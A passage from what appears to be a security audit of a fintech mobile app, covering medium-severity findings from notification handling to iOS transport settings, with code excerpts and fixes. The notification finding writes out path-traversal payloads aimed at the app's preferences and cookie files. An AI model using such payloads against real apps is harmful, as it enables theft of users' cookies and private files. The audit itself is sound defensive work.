return notifee.onForegroundEvent(async ({ type, detail }) => {
  const notificationType = detail.notification?.data?.type;
  if (type === EventType.PRESS) {
    if (Platform.OS === "ios" && notificationType === "Document_IOS") {
      NativeModules.FileManagerModule.getDocumentDirectoryPath(
        async (documentDirectory: string) => {
          await FileViewer.open(
            documentDirectory + "/" + detail.notification?.body!   // ← unvalidated
          );
        }
      );
    } else if (Platform.OS === "android" && notificationType === "Document_Android") {
      await NativeModules.FileManagerModule.goToFolder("Downloads");
    }
  }
});
```

`detail.notification?.body` is server-controlled content. There is:
- No path normalisation — `../../` sequences are not stripped.
- No allow-list of filenames or extensions.
- No check that the resolved path stays within the documents directory.
- A non-null assertion (`!`) that suppresses the TypeScript warning about it being possibly undefined.

A notification with body `../Library/Preferences/com.exchangapay.tst.plist` or `../../Library/Cookies/Cookies.binarycookies` would resolve outside the intended directory. `FileViewer.open` then hands the file to the iOS document interaction controller, which can display it and offer "share" actions — providing an exfiltration path.

**Attack scenario.**
1. An attacker who can send push notifications to the app — requiring the FCM server key, or a compromise/misconfiguration of the notification backend — crafts a notification with `data.type = "Document_IOS"` and a traversal path in the body.
2. The user taps the notification.
3. An arbitrary file within the app sandbox is opened in the document viewer, from which it can be shared to an attacker-controlled destination.

The attack requires push-send capability, which is the main limiting factor — but the app has no App Check or FCM hardening ([H-15](#h-15--firebase-configuration-files-committed-pointing-at-the-test-project)), and the sender ID is public.

**Recommended fix.**
```tsx
const SAFE_NAME = /^[A-Za-z0-9._-]{1,128}$/;
const ALLOWED_EXT = new Set([".pdf", ".png", ".jpg", ".jpeg", ".xlsx", ".csv"]);

const openDocument = async (documentDirectory: string, rawName?: string) => {
  if (!rawName) return;
  const name = rawName.trim();
  if (!SAFE_NAME.test(name)) return;                       // rejects "../", "/", etc.
  const ext = name.slice(name.lastIndexOf(".")).toLowerCase();
  if (!ALLOWED_EXT.has(ext)) return;
  const path = `${documentDirectory}/${name}`;
  if (!path.startsWith(documentDirectory + "/")) return;   // belt and braces
  await FileViewer.open(path);
};
```
Better still: **do not put filenames in the notification body at all**. Send a document *identifier* in `data`, and have the app look up the corresponding local file from its own records — the notification then carries no path material.

Also validate `detail.notification?.data?.type` against an allow-list rather than comparing against two magic strings, and apply the same review to the background handler in [index.js:11-21](index.js#L11-L21), which reads `remoteMessage?.notification?.title === "Support Chat"` to increment a counter (lower risk, but the same pattern of trusting notification content).

**Best practice.** Treat push notification payloads as untrusted remote input. Notifications should carry opaque identifiers that the app resolves against its own state, never file paths, URLs, or executable instructions.

---

### M-06 — Over-Broad Android Permissions

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-250 (Execution with Unnecessary Privileges), CWE-732 |
| **MASVS** | MASVS-PLATFORM-1, MASVS-PRIVACY-1 |
| **File** | [android/app/src/main/AndroidManifest.xml:4-12](android/app/src/main/AndroidManifest.xml#L4-L12) |

**Technical explanation.**

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.VIBRATE"/>
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="com.google.android.gms.permission.AD_ID" tools:node="remove" />
```

Issues:

| Permission | Concern |
|---|---|
| `RECORD_AUDIO` | **No microphone feature exists in the app.** It is pulled in by `react-native-vision-camera` (video capture) and is required by the Sumsub liveness SDK. If neither records audio, this should be removed — it is a high-sensitivity runtime permission that will alarm privacy-conscious users and reviewers. |
| `WRITE_EXTERNAL_STORAGE` | **Has no effect on API 30+** (scoped storage) and is not needed on API 29+ given the app uses `MediaStore`/DownloadManager via `react-native-blob-util`. Missing `android:maxSdkVersion="28"`. |
| `READ_EXTERNAL_STORAGE` | Deprecated on API 33+ in favour of granular `READ_MEDIA_IMAGES`. Missing `android:maxSdkVersion="32"`. Grants read access to the entire shared storage volume where it does apply. |
| `WAKE_LOCK` | No obvious use; likely pulled in by `react-native-push-notification`. Should be removed with that library ([H-12](#h-12--21-known-dependency-vulnerabilities-11-high-severity)). |

**Positives worth noting:** `android:allowBackup="false"` is correctly set (blocking `adb backup` extraction of app data), `AD_ID` is explicitly removed via `tools:node="remove"` (good privacy hygiene), and no dangerous permissions like `READ_SMS`, `READ_CONTACTS`, `ACCESS_FINE_LOCATION`, or `QUERY_ALL_PACKAGES` are present. Notably, `ACCESS_FINE_LOCATION` is absent on Android even though the iOS `Info.plist` declares `NSLocationWhenInUseUsageDescription` — an inconsistency worth resolving (see [§9](#9-ios-security-review)).

**Impact.** Excessive permissions increase attack surface (a compromised app process gains microphone and broad storage access), raise store-review friction, and erode user trust. `RECORD_AUDIO` in particular is a permission users notice.

**Recommended fix.**
1. **Audit whether audio is genuinely needed.** If Sumsub liveness requires it, keep it but ensure it is requested contextually (only when the KYC flow starts) rather than being visible at install. If not, remove it and set `VisionCamera_enableFrameProcessors` accordingly.
2. **Bound the storage permissions:**
   ```xml
   <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
                    android:maxSdkVersion="32" />
   <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
                    android:maxSdkVersion="28" />
   <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
   ```
3. **Remove `WAKE_LOCK`** once `react-native-push-notification` is removed.
4. **Add `android:dataExtractionRules`** (API 31+) alongside `allowBackup="false"` to also block device-to-device transfer:
   ```xml
   <application android:allowBackup="false"
                android:dataExtractionRules="@xml/data_extraction_rules"
                android:fullBackupContent="false" ... >
   ```
5. **Request permissions contextually.** [App.tsx:103-106](App.tsx#L103-L106) requests `POST_NOTIFICATIONS` on first launch before explaining why; the app already depends on `react-native-permissions`, so use it to request each permission at the point of need with a rationale.

**Best practice.** Declare the minimum permission set, bound legacy permissions with `maxSdkVersion`, and request at point of use. Run `aapt dump permissions` on the release APK as a CI check to catch permissions silently added by dependency updates — this is how `RECORD_AUDIO` and `WAKE_LOCK` typically appear.

---

### M-07 — Financial Documents Written to World-Readable Public Storage

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-922 (Insecure Storage of Sensitive Information), CWE-276 (Incorrect Default Permissions) |
| **MASVS** | MASVS-STORAGE-2 |
| **Files** | [src/utils/tools.js:56-95](src/utils/tools.js#L56-L95), [src/screens/Crypto/cryptoCardTransations/DownloadBill.tsx:124](src/screens/Crypto/cryptoCardTransations/DownloadBill.tsx#L124), [src/components/FileUpload/filePreviewWithId.tsx:143-200](src/components/FileUpload/filePreviewWithId.tsx#L143-L200) |

**Technical explanation.** Statements, bills, and downloaded documents are written to the **public Downloads directory** on Android:

```js
// src/utils/tools.js
const { DownloadDir, DocumentDir } = BlobUtil.fs.dirs;
const options = Platform.select({
  ios:     { fileCache: true, path: `${DocumentDir}${...}.${fileExt}`, notification: true },
  android: {
    fileCache: true,
    addAndroidDownloads: {
      useDownloadManager: true,
      notification: true,
      path: `${DownloadDir}/me_${Math.floor(date.getTime() + date.getSeconds() / 2)}.${fileExt}`,
      ...
    },
  },
});
```

and similarly in `DownloadBill.tsx` and `filePreviewWithId.tsx`, which also uses `RNFS.writeFile(path, base64Data, "base64")` to `RNFS.DownloadDirectoryPath`.

The documents in question are **transaction statements, card bills, and uploaded KYC files** — containing account numbers, transaction histories, balances, and personal identity data.

Files in the public Downloads directory are:
- Readable by any app with storage permission (and on older Android versions, by any app at all).
- Included in cloud backup services (Google Drive backup, Google Photos if images).
- Persistent after app uninstall.
- Accessible to any user of a shared device.

The filename generation is also weak: `me_${Math.floor(date.getTime() + date.getSeconds() / 2)}` is predictable and provides no protection.

Note the app *does* use `DocumentDir` (app-private) on iOS, which is correct — the exposure is Android-specific and stems from using `DownloadDir` for the user-visible download experience.

**Attack scenario.**
1. A malicious app with `READ_EXTERNAL_STORAGE` (a very common permission) scans `/storage/emulated/0/Download/` for files matching `me_*.pdf`.
2. It reads the victim's full transaction statements and card bills.
3. On a shared or family device, any user browsing Downloads sees the same files.

**Recommended fix.**
1. **Write to app-private storage by default:**
   ```js
   const targetDir = Platform.OS === "android"
     ? BlobUtil.fs.dirs.DocumentDir      // app-private on Android too
     : BlobUtil.fs.dirs.DocumentDir;
   ```
2. **Use the Storage Access Framework for user-initiated exports.** When the user explicitly chooses to save a statement, present the system file picker (`ACTION_CREATE_DOCUMENT`) so the file goes where the user chose, with the user's informed consent — rather than silently landing in a world-readable directory.
3. **Alternatively, share rather than save.** Use `react-native-share` (already a dependency) to hand the document directly to the user's chosen app from a private `FileProvider` URI, without persisting it in shared storage.
4. **Delete temporary files after viewing.** `fileCache: true` leaves files behind; add explicit cleanup:
   ```js
   await FileViewer.open(path);
   // after dismissal
   await BlobUtil.fs.unlink(path);
   ```
5. **Use unpredictable filenames** derived from `QuickCrypto.randomBytes` rather than a timestamp, for whatever files must persist.
6. **Configure a `FileProvider`** in the manifest for any file sharing, so URIs are scoped and time-limited rather than raw `file://` paths.

**Best practice.** Financial documents should never touch shared storage without an explicit user action that names the destination. Prefer transient, in-app viewing over persistence; where persistence is required, use app-private storage with encryption at rest.

---

### M-08 — iOS Entitlements Set to Development APS Environment

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-1188 (Insecure Default Initialization) |
| **File** | [ios/exchangapay/exchangapay.entitlements](ios/exchangapay/exchangapay.entitlements) |

**Technical explanation.**
```xml
<dict>
	<key>aps-environment</key>
	<string>development</string>
</dict>
```

This is the **only** entitlement declared. Two consequences:

1. **`aps-environment: development`** routes push notifications through Apple's sandbox APNs (`api.sandbox.push.apple.com`). A build submitted to TestFlight or the App Store with this entitlement **cannot receive production push notifications** — device tokens issued under the sandbox environment are not valid for the production APNs endpoint. Given the app depends on push for support-chat notifications ([index.js:11-21](index.js#L11-L21)) and document-ready alerts ([AppContainer.tsx:141](src/navigation/AppContainer.tsx#L141)), this breaks a core feature in any released build. (Xcode's automatic signing sometimes rewrites this at archive time, but relying on that is fragile — the checked-in value should be correct.)
2. **No other entitlements are declared**, notably:
   - **No Keychain Sharing / Access Group.** Not required for this app, but worth confirming it is intentional.
   - **No Associated Domains.** Universal Links are therefore not configured — see [M-13](#m-13--no-deep-link-or-universal-link-configuration).
   - **No App Attest / DeviceCheck** entitlement, consistent with [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation).
   - **No Data Protection entitlement** (`com.apple.developer.default-data-protection`). Setting `NSFileProtectionComplete` would encrypt app files when the device is locked — valuable given the document-handling in [M-07](#m-07--financial-documents-written-to-world-readable-public-storage).

**Recommended fix.**
1. **Use per-configuration entitlements files:** `exchangapay.entitlements` (Debug → `development`) and `exchangapay-Release.entitlements` (Release → `production`), wired via the `CODE_SIGN_ENTITLEMENTS` build setting per configuration.
2. **Add data protection:**
   ```xml
   <key>com.apple.developer.default-data-protection</key>
   <string>NSFileProtectionComplete</string>
   ```
3. **Add App Attest** when implementing [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation):
   ```xml
   <key>com.apple.developer.devicecheck.appattest-environment</key>
   <string>production</string>
   ```
4. **Add Associated Domains** when implementing Universal Links ([M-13](#m-13--no-deep-link-or-universal-link-configuration)).
5. **Verify the shipped entitlements** — add a CI step running `codesign -d --entitlements - <app>` on the archive and asserting `aps-environment` is `production`.

**Best practice.** Entitlements should differ per build configuration and be verified in the release pipeline. A development APNs entitlement reaching production is a classic silent failure — the app builds, installs, and runs, and push simply never arrives.

---

### M-09 — Sumsub KYC SDK Initialised With Debug Mode Enabled

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-489 (Active Debug Code), CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
| **File** | [src/components/sumsub.tsx:88-127](src/components/sumsub.tsx#L88-L127) |

**Technical explanation.**

```tsx
sdkInstance.current = SNSMobileSDK.init(response?.data?.token, () => {
    return fetch('http://example.org/', {          // ← placeholder, and plain HTTP
        method: 'GET',
    }).then(resp => {
        return 'new_access_token';                  // ← stub token refresh
    });
})
    .withHandlers({
        onStatusChanged: (event) => { },            // ← empty
        onLog: (event) => { },                      // ← empty
        onEvent: (event) => { ... }
    })
    .withDebug(true)                                 // ← debug logging in production
    .withLocale('en')
    .withApplicantConf({
        "firstName": decryptedFirstName || null,
        "lastName":  decryptedLastName  || null,
        "email":     decryptedEmail     || null,
        "phone":     decryptedPhoneCode + " " + decryptedPhone || null,
        "country":   userInfo?.country,
        "date of birth": userInfo?.dob
    })
    .build();
```

Three issues:

1. **`.withDebug(true)`** enables verbose SDK logging in all builds. Sumsub's debug output includes SDK state transitions, network activity, and applicant metadata — written to the device log, where any app with log access (on older Android) or anyone with `adb logcat` / Console.app can read it. Given the payload includes **decrypted PII** (name, email, phone, DOB), this is a real disclosure.
2. **The token-refresh callback is a stub** pointing at `http://example.org/` over **plain HTTP** and returning a hardcoded `'new_access_token'` string. When the Sumsub access token expires mid-flow, the SDK will call this, receive a garbage token, and fail. The plain-HTTP request also violates the app's own ATS/cleartext posture (it would be blocked on both platforms by default, so it fails rather than leaking — but the code is clearly unfinished).
3. **`onStatusChanged` and `onLog` handlers are empty**, so genuine KYC status transitions and SDK errors are not captured anywhere — consistent with [M-04](#m-04--silent-error-swallowing-throughout-the-codebase).

The `withApplicantConf` call passing decrypted PII is itself correct behaviour (Sumsub needs it to prefill), but it means that PII is in scope for whatever `.withDebug(true)` logs.

**Recommended fix.**
```tsx
.withDebug(__DEV__)                                  // debug only in dev builds
```
and implement the token refresh properly:
```tsx
SNSMobileSDK.init(response?.data?.token, async () => {
    const refreshed = await OnBoardingService.sumsubAccessToken(
        userInfo.userId,
        props?.route?.params?.cardKycLevl || userInfo?.kycLevel
    );
    return refreshed?.data?.token;
})
```
and populate the handlers:
```tsx
.withHandlers({
    onStatusChanged: (e) => Sentry.addBreadcrumb({ category: "kyc", message: e?.newStatus }),
    onLog: (e) => { if (__DEV__) console.log("[sumsub]", e); },
    onEvent: (event) => { /* existing logic */ },
})
```

**Best practice.** Third-party SDK debug flags should be tied to `__DEV__` or a build variant, never hardcoded to `true`. Placeholder callbacks (`example.org`, stub return values) should fail the build — add a CI grep for `example.org`, `example.com`, and `localhost` in `src/`.

---

### M-10 — Third-Party IP Geolocation Call With Inverted Connectivity Logic

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-359 (Exposure of Private Information), CWE-670 (Always-Incorrect Control Flow) |
| **File** | [src/navigation/AppContainer.tsx:112-136](src/navigation/AppContainer.tsx#L112-L136) |

**Technical explanation.** Two distinct problems in the same block.

**Problem 1 — Inverted logic.** `getIpAddress()` is called when the device is **offline**:

```tsx
useEffect(() => {
    if (netInfo.isConnected != null) {
      if (!netInfo.isConnected) {          // ← when NOT connected
        setIsConnected(true);              // ← sets "isConnected" to true (also inverted naming)
        getIpAddress();                    // ← network call while offline
      } else {
        setIsConnected(false);
      }
    } else {
      setIsConnected(false);
    }
}, [netInfo.isConnected]);
```

The `getIpAddress()` call inside the `!netInfo.isConnected` branch will always fail — there is no network. The state variable `isConnected` is set to `true` when disconnected and `false` when connected, which is the opposite of its name; it is used to render the `NoInternet` screen, so the *rendering* is correct but the naming and the placement of the fetch are not. A second, unconditional `getIpAddress()` in the next `useEffect` ([:135](src/navigation/AppContainer.tsx#L135)) is what actually populates the value.

**Problem 2 — PII sent to a third party.** The IP lookup uses `ipinfo.io`:

```tsx
const getIpAddress = async () => {
    try {
      const response = await fetch("https://ipinfo.io/json");
      const data = await response.json();
      dispatch(isSetIpInfo(data));
    } catch (error) {
      return "Unable to fetch IP address";      // ← returned from an async fn, ignored
    }
}
```

Every app launch discloses the user's IP address to `ipinfo.io`, a third party with no contractual relationship declared. The response (containing IP, city, region, country, coordinates, and ASN) is stored in Redux, **persisted** ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)), and then attached to **every API request** as a header:

```ts
// src/utils/ApiService.ts:166-168
if (userInfo?.UserReducer?.ipInfo) {
    config.headers.ipAddress = `${userInfo?.UserReducer?.ipInfo.ip || ""}`;
}
```

Sending a **client-asserted** IP address in a header is itself questionable: if the backend uses this header for fraud detection, geo-restriction, or audit logging, it is trusting a value the client fully controls. An attacker can set any IP they like by patching the app or intercepting the request ([H-03](#h-03--no-certificate-pinning-on-either-platform)) — defeating any geo-blocking or velocity check that relies on it.

**Impact.**
- **Privacy:** IP and geolocation disclosed to an undeclared third-party processor on every launch (GDPR Art. 13/14 transparency; Art. 28 processor agreement).
- **Security:** A spoofable `ipAddress` header used for fraud/AML controls provides false assurance.
- **Reliability:** The offline branch makes a call that cannot succeed.

**Recommended fix.**
1. **Fix the connectivity logic** and rename the variable:
   ```tsx
   const [isOffline, setIsOffline] = useState(false);
   useEffect(() => {
     if (netInfo.isConnected == null) return;
     setIsOffline(!netInfo.isConnected);
     if (netInfo.isConnected) getIpAddress();     // fetch only when online
   }, [netInfo.isConnected]);
   ```
2. **Stop sending a client-asserted IP header.** The backend already sees the real source IP on the TCP connection — use that. Remove the `config.headers.ipAddress` line and the `ipInfo` Redux state entirely.
3. **If geolocation is genuinely needed** for AML/fraud purposes, derive it **server-side** from the connection IP. This is both more accurate and unspoofable.
4. **If the third-party lookup must stay**, proxy it through your own backend so the user's IP is not disclosed to `ipinfo.io` directly, declare the processor in the privacy policy, and put a DPA in place.
5. **Fix the error return** — `return "Unable to fetch IP address"` from an `async` function returns a resolved Promise that nothing consumes.
6. **Reconcile with the iOS location permission.** `Info.plist` declares `NSLocationWhenInUseUsageDescription` ("Your location is used for fraud prevention and to comply with financial regulations") but no code requests location. Either implement it properly or remove the declaration — an unused sensitive-permission string will draw App Review questions.

**Best practice.** Never trust the client for security-relevant environmental data (IP, time, location, device state). Collect it server-side, and disclose every third-party data recipient in the privacy policy with a processor agreement in place.

---

### M-11 — No Client-Side Rate Limiting; Fixed-Interval Chat Polling

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-799 (Improper Control of Interaction Frequency) |
| **Files** | [src/screens/Chatbot/chatscreen.tsx:62-76](src/screens/Chatbot/chatscreen.tsx#L62-L76), OTP flows across [src/screens/onBoarding/](src/screens/onBoarding/) |

**Technical explanation.**

**Polling.** The support chat polls unconditionally every 60 seconds while visible:
```tsx
intervalId = setInterval(() => {
    if (props?.isChatVisible) { getChatHistory(); }
}, 60000);
```
There is no backoff when the chat is idle, no pause when the app is backgrounded, and no long-polling or push-driven alternative — despite the app already receiving FCM messages for `"Support Chat"` ([index.js:12](index.js#L12)), which is exactly the signal that should trigger a fetch.

**No debouncing on user-triggered requests.** Buttons across the app call services directly on press with no debounce or in-flight guard. Representative: OTP resend flows in [rigistration.tsx:94](src/screens/onBoarding/rigistration.tsx#L94), [phoneOtpVerification.tsx:76](src/screens/onBoarding/phoneOtpVerification.tsx#L76), and [payeeEmailVerification.tsx:56](src/screens/Addressbook/payeeEmailVerification.tsx#L56) manage a countdown timer for the *UI*, but nothing prevents rapid re-submission of the underlying request.

The one place a guard exists is the 2FA validation, which uses an `isApitriggerd` flag ([sendCryptoDetails.tsx:431](src/screens/Crypto/sendCryptoDetails.tsx#L431)) — demonstrating the team knows the pattern; it simply is not applied consistently.

**A useEffect dependency bug amplifies this:**
```tsx
useEffect(() => {
    if (/^[0-9]\d*(\.\d+)?$/.test(sendAmmount)) { getFeeDetails(); }
}, [sendAmmount, handleFee()])          // ← function CALL in the dependency array
```
`handleFee()` is invoked on every render and its return value used as a dependency. Since it returns a number derived from state, this mostly stabilises — but any render where `networkLu` or `selectedNetwork` changes identity re-triggers `getFeeDetails()`, generating redundant API calls on the withdrawal screen.

**Impact.**
- **Server load / cost:** Every active chat session generates a request per minute regardless of activity.
- **Battery and data:** Continuous polling on mobile.
- **Abuse enablement:** Without client-side throttling, OTP endpoints can be hammered — the real defence must be server-side, but the client should not make abuse trivial.
- **UX:** Duplicate submissions on double-tap.

Note this is a **client-side** finding. Actual rate limiting **must** be enforced server-side; the client cannot be trusted to throttle itself. The presence of a `429` handler in [`isErrorDispaly`](src/utils/helpers/index.tsx#L557-L559) suggests the backend does return 429 — that should be verified for all sensitive endpoints (OTP send/verify, login, password change, withdrawal, card PIN reveal).

**Recommended fix.**
1. **Replace polling with push.** The FCM `"Support Chat"` message already arrives ([index.js:12](index.js#L12)); use it to trigger `getChatHistory()` instead of a timer. Keep a long-interval fallback (e.g. 5 minutes) for reliability.
2. **Pause polling when backgrounded:**
   ```tsx
   useEffect(() => {
     const sub = AppState.addEventListener("change", (s) => {
       if (s !== "active" && intervalId.current) clearInterval(intervalId.current);
     });
     return () => sub.remove();
   }, []);
   ```
3. **Add an in-flight guard to every submit handler.** A small shared hook:
   ```tsx
   const useSubmitGuard = () => {
     const inFlight = useRef(false);
     return useCallback(async (fn: () => Promise<void>) => {
       if (inFlight.current) return;
       inFlight.current = true;
       try { await fn(); } finally { inFlight.current = false; }
     }, []);
   };
   ```
4. **Fix the `handleFee()` dependency** — compute the value and include the value, not the call:
   ```tsx
   const networkId = useMemo(() => handleFee(), [networkLu, selectedNetwork]);
   useEffect(() => { /* … */ }, [sendAmmount, networkId]);
   ```
5. **Verify server-side rate limits** on: OTP send/verify, login, password change/reset, withdrawal initiation, card PIN reveal, referral validation, and the Kommo proxy endpoints introduced per [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript).

**Best practice.** Client-side throttling is a UX and cost optimisation; server-side rate limiting is the security control. Implement both, and prefer event-driven updates over polling wherever a push channel already exists.

---

### M-12 — Production Error Reporting Effectively Disabled

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** (operational/security-visibility) |
| **CWE** | CWE-778 (Insufficient Logging) |
| **MASVS** | MASVS-CODE-1 |
| **Files** | [Environment.js:27-30](Environment.js#L27-L30), [App.tsx:44](App.tsx#L44) |

**Technical explanation.** Sentry initialisation is gated on `oAuthConfig.sentryLoggs`:

```tsx
if (oAuthConfig.sentryLoggs) {
  Sentry.init({ ... });
}
```

But in `Environment.js`, **`sentryLoggs: false`** in both the `prod` and `tst` configurations, and the `dev` config has no `sentryLoggs` key at all (so it is `undefined` → falsy). Combined with [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) forcing `tst`, **`Sentry.init()` never executes in any build**.

Consequences:
- `Sentry.wrap(App)` still wraps the component tree but has no configured client.
- `logApiErrorToSentry` ([ApiService.ts:25](src/utils/ApiService.ts#L25)) calls `Sentry.withScope` and `Sentry.captureException` on every API failure — all no-ops.
- The Metro config wraps with `withSentryConfig` ([metro.config.js:19](metro.config.js#L19)) and the Android build applies `sentry.gradle` ([android/app/build.gradle:88](android/app/build.gradle#L88)) — so source maps and symbols are being uploaded for a client that never initialises.

Crashlytics **is** active (`setCrashlyticsCollectionEnabled(true)` unconditionally at [ApiService.ts:200](src/utils/ApiService.ts#L200)), so native crashes and the explicit `crashlytics().log()`/`recordError()` calls do report — into the **test** Firebase project ([H-15](#h-15--firebase-configuration-files-committed-pointing-at-the-test-project)), with tokens and PII attached ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)).

So the current state is the worst of both: the reporter that would give structured JS error visibility is off, and the one that is on is over-collecting into the wrong project.

Combined with [M-04](#m-04--silent-error-swallowing-throughout-the-codebase) (dozens of empty catch blocks), **JS-layer failures in production are essentially invisible**. A security incident — an authentication failure spike, a wave of decryption errors, an unexpected 401 pattern — would not be detected.

**Impact.**
- **No detection capability** for security-relevant error patterns.
- **Extended incident dwell time** — problems are found via user complaints rather than telemetry.
- **Wasted build effort** uploading source maps for a disabled client.

**Recommended fix.**
1. **Enable Sentry with the privacy fixes from [H-08](#h-08--sentry-session-replay-and-pii-collection-enabled) applied first** — replay off, `sendDefaultPii: false`, `beforeSend` scrubber in place. Do not simply flip the flag.
2. **Fix the config field names** — `sentryEnvornment` is misspelled, and `sentryLoggs` conflates three distinct concerns (init on/off, PII collection, log capture). Split them:
   ```js
   sentry: {
     enabled: true,
     dsn: "...",
     environment: "production",
     sendPii: false,
     tracesSampleRate: 0.1,
     replaysSessionSampleRate: 0,
   }
   ```
3. **Drive `environment` from the resolved build environment**, not a hardcoded `"development"` string (which also appears at [ApiService.ts:38](src/utils/ApiService.ts#L38) and [:84](src/utils/ApiService.ts#L84)).
4. **Add security-relevant instrumentation** once reporting works: authentication failures, token-refresh failures, decryption failures, biometric failures, and unexpected 401/403 rates. These are the signals that reveal an attack in progress.
5. **Set up alerting** on error-rate spikes and on specific security events.

**Best practice.** Observability is a security control. Structured, scrubbed error reporting with alerting on security-relevant events is how you learn about an incident before your customers tell you. Ensure it is on, correctly configured, and pointed at the right project — and verify by deliberately triggering an error in a release build.

---

### M-13 — No Deep Link or Universal Link Configuration

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-939 (Improper Authorization in Handler for Custom URL Scheme) — *by omission and by risk of future misconfiguration* |
| **MASVS** | MASVS-PLATFORM-3 |
| **Files** | [android/app/src/main/AndroidManifest.xml](android/app/src/main/AndroidManifest.xml), [ios/exchangapay/Info.plist](ios/exchangapay/Info.plist) |

**Technical explanation.** The current state is unusual and warrants attention in both directions.

**Android** declares exactly one activity with one intent filter:
```xml
<activity android:name=".MainActivity" android:launchMode="singleTask" android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.MAIN" />
    <category android:name="android.intent.category.LAUNCHER" />
  </intent-filter>
</activity>
```
No `VIEW` intent filter, no custom scheme, no App Links. `android:exported="true"` is **required** for the launcher activity, so that is correct.

However, the **Auth0 callback scheme is injected via manifest placeholders**:
```gradle
manifestPlaceholders = [auth0Domain: "exchangapay-tst.eu.auth0.com",
                        auth0Scheme: "${applicationId}.auth0"]
```
`react-native-auth0`'s own manifest contributes a `RedirectActivity` with a `VIEW` filter for `com.exchangapay.tst.auth0://…`. So there **is** an exported, deep-link-reachable activity in the merged manifest, contributed by a library. This is the standard Auth0 pattern and is generally safe (the redirect carries an authorization code protected by PKCE), but it means the merged manifest should be reviewed — inspect `android/app/build/intermediates/merged_manifests/release/AndroidManifest.xml` to confirm exactly what is exported.

**iOS declares no `CFBundleURLTypes` at all.** This is a functional problem: `react-native-auth0` on iOS requires a registered URL scheme (`{PRODUCT_BUNDLE_IDENTIFIER}.auth0` or similar) for the authorization callback. Without it, `authorize()` cannot return to the app — **the iOS login flow may be broken**, or is relying on `ASWebAuthenticationSession`'s ephemeral callback handling. This should be tested end-to-end on a device.

**No Universal Links / App Links** are configured on either platform (no `assetlinks.json` reference, no Associated Domains entitlement — see [M-08](#m-08--ios-entitlements-set-to-development-aps-environment)). For a fintech app, this means:
- Emails and SMS containing links cannot open the app directly.
- Any future addition of a custom scheme would be **hijackable** — custom schemes are first-come-first-served on Android and unverified on iOS, so a malicious app can register the same scheme and intercept links.

**Impact.**
- **Functional:** iOS Auth0 callback likely misconfigured.
- **Latent security risk:** When deep linking is eventually added (as it will be, for password reset, payment confirmations, or referral links), doing it with custom schemes rather than verified App Links/Universal Links creates a hijacking vector.

**Recommended fix.**
1. **Verify the iOS Auth0 callback works.** If it does not, add:
   ```xml
   <key>CFBundleURLTypes</key>
   <array>
     <dict>
       <key>CFBundleURLName</key><string>auth0</string>
       <key>CFBundleURLSchemes</key>
       <array><string>$(PRODUCT_BUNDLE_IDENTIFIER).auth0</string></array>
     </dict>
   </array>
   ```
2. **Review the merged Android manifest** for all exported components contributed by libraries. Run:
   ```bash
   ./gradlew :app:processReleaseManifest && \
     grep -n 'exported="true"' android/app/build/intermediates/merged_manifests/release/AndroidManifest.xml
   ```
   Confirm every exported activity/service/receiver is intentional.
3. **When adding deep links, use verified links only:**
   - **Android App Links** with `android:autoVerify="true"` and a hosted `/.well-known/assetlinks.json`.
   - **iOS Universal Links** with an Associated Domains entitlement and a hosted `/.well-known/apple-app-site-association`.
   Avoid custom schemes for anything security-relevant.
4. **Validate every deep link parameter** at the handler, and **never** allow a deep link to perform an authenticated action directly (e.g. `exchangapay://withdraw?address=…&amount=…`). Deep links should navigate; the user must then authenticate and confirm.
5. **Add `android:launchMode` review** — `singleTask` combined with a future `VIEW` filter requires careful `onNewIntent` handling to avoid task-hijacking (StrandHogg-style) issues.

**Best practice.** Configure verified App Links / Universal Links from the outset, treat every deep link as untrusted input, and require re-authentication before any deep link results in a state-changing action.

---

### M-14 — iOS ATS Permits Local Networking

| | |
|---|---|
| **Severity** | 🟡 **MEDIUM** |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information) |
| **MASVS** | MASVS-NETWORK-1 |
| **File** | [ios/exchangapay/Info.plist:29-35](ios/exchangapay/Info.plist#L29-L35) |

**Technical explanation.**
```xml
<key>NSAppTransportSecurity</key>
<dict>
	<key>NSAllowsArbitraryLoads</key>
	<false/>
	<key>NSAllowsLocalNetworking</key>
	<true/>
</dict>
```

`NSAllowsArbitraryLoads: false` is **correct and good** — arbitrary cleartext is blocked.

`NSAllowsLocalNetworking: true` exempts local-network destinations (`.local` hostnames, and IPv4/IPv6 addresses in the private/link-local ranges) from ATS. This is the React Native template default, present so Metro's dev server on `localhost` works in Debug builds.

In a **release** build it serves no purpose and creates a narrow exemption: cleartext HTTP to any private-range address is permitted. An attacker on the same network operating a device at, say, `192.168.1.50` could be reached over plain HTTP by the app if any code path were induced to request it — for example via the unconstrained WebView in [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow), which has no `originWhitelist` and would happily load `http://192.168.1.50/`.

